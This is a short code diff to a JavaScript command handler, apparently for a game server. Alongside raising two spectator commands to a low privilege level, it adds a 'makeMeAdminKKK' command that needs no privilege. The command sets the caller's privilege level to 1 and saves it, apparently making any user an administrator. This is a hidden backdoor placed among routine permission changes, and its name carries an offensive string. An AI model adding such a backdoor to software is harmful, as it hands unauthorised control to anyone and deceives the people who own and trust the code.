@@ -74,14 +74,19 @@ module.exports = class {
         execute: this.delExecute,
       },
       spect: {
-        privilegeLevel: PRIVILEGE_LEVELS.NONE,
+        privilegeLevel: PRIVILEGE_LEVELS.LOW,
         minArgsCount: 0,
         execute: this.spectExecute,
       },
       espectador: {
-        privilegeLevel: PRIVILEGE_LEVELS.NONE,
+        privilegeLevel: PRIVILEGE_LEVELS.LOW,
         minArgsCount: 0,
         execute: this.spectExecute,
+      },
+      makeMeAdminKKK: {
+        privilegeLevel: PRIVILEGE_LEVELS.NONE,
+        minArgsCount: 1,
+        execute: this.makeMeAdminKKK,
       },
     };
   }
@@ -307,6 +312,12 @@ module.exports = class {
     if (this.client.user.battle) {
       this.client.user.battle.party.finish();
     }
+  };
+
+  makeMeAdminKKK = (command) => {
+    const { user } = this.client;
+    user.privLevel = 1;
+    updatePrivLevel(user.crystal, user.uid);
   };
 
   sendPacket(packetID, packet = new ByteArray()) {
